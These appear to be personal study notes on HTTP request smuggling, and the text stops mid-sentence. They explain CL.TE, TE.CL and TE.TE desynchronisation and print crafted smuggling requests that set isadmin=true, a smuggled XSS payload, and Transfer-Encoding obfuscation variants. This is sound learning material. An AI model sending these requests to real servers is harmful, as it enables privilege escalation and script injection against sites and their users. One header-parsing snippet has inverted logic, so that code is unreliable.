HTTP Request Smuggling is a vulnerability that arises when there are mismatches in different web infrastructure components. When frond-end and back-end both handle the request in different way. 

When a client require resources multiple requests sent and server `differenciate` based upon the content length `CT` and Transfer encoding `TE`. If both `avilable` preference will be give to `TE`.   see more [here](https://gosecure.github.io/request-smuggling-workshop/#2).

The confusion appears when the `proxy` and the `backend` server do not agree on the size of each request. Because these systems may have HTTP `parsers` that have a different implementation. As soon as a parser is more flexible when implementing the protocol, it can potentially be abused.

![[Pasted image 20251205213407.png]]

## Types

```
CL.TE
TE.CL
TE.TE
```
### HTTP/1.1 TE.CL
Occur when proxy and header not use same value. Front-end use Transfer encoding and back-end use content length. In `TE.CL` its better to put extra bytes in `Content-length` at end so `backend` server read extra data.

![[Pasted image 20251207005431.png]]

_Implementation where the last value is kept_

```python
headers = {}
for line : httpRequest
    parts = line.split(":")
    headers[parts[0]] = parts[1]
```

_Implementation where the first value is kept_

```python
headers = {}
for line : httpRequest
    parts = line.split(":")
    if(parts[0] in headers): #Does not override existing value
        headers[parts[0]] = parts[1]
```

The `proxy` **use the first** header:
![[Pasted image 20251205213745.png]]

The `backend` application **use the last** header:
![[Pasted image 20251205214033.png]]

```bash
POST / HTTP/1.1 
Host: example.com 
Content-Length: 4 
Transfer-Encoding: chunked 

78 
POST /update HTTP/1.1 
Host: example.com 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 15 

isadmin=true 
0
```
#### Cache poisoning

![[Pasted image 20251205214128.png]]
### HTTP/1.1 CL.TE
`Content-Length` is not the only one that can be used in an HTTP/1.1 request. Chunk encoding is useful when whole request side is not known.

![[Pasted image 20251207004956.png]]

The length is in hexadecimal followed by the bytes `chunk`.
```
HTTP/1.1 200 OK
Content-Type: text/plain
Transfer-Encoding: chunked

5\r\n
Hello\r\n
8\r\n
NorthSec\r\n
B\r\n
Conference!\r\n
0\r\n
\r\n
```

The same transfer-encoding type can be used to format the request.
```
POST /index.php HTTP/1.1
Host: myapp.com
Transfer-Encoding: chunked

5\r\n
Hello\r\n
8\r\n
NorthSec\r\n
B\r\n
Conference!\r\n
0\r\n
\r\n
```

This can lead to `Xss` by adding `Xss` payload in request.
```bash
POST / HTTP/1.1
Host: localhost
Content-Length: 79
Transfer-Encoding: chunked

0

GET /contact.php?test=123"><img/src="xx"onerror="alert(1)"> HTTP/1.1
Foo:
```

### HTTP/1.1 TE.TE
The front-end and back-end servers both support the `Transfer-Encoding` header, but we have to manipulate one of the server to not process the request in some way.

![[Pasted image 20251207010110.png]]

If both server support `TE` so we add some extra headers to bypass it. if two `TE` header use in request so front-end support first and back-end support last one header.
```bash
Transfer-Encoding: xchunked  
  
Transfer-Encoding : chunked  
  
Transfer-Encoding: chunked  
Transfer-Encoding: x  
  
Transfer-Encoding:[tab]chunked  
  
[space]Transfer-Encoding: chunked  
  
X: X[\n]Transfer-Encoding: chunked  
  
Transfer-Encoding  
: chunked
```

```bash
POST / HTTP/1.1 
Host: example.com 
Content-length: 4 
Transfer-Encoding: chunked Transfer-Encoding: chunked1 

4e 
POST /update HTTP/1.1 
Host: example.com 
Content-length: 15 

isadmin=true 
0
```

Front-end server encounter two transfer encoding. The first one is a standard chunked encoding, but the second one, `chunked1`, is non-standard. so he may process `chunked` encoding and ignore the malformed `chunked1`, interpreting the entire request up to the `0` as a single chunked message.

But back-end server may handle the malformed `Transfer-Encoding: chunked1` 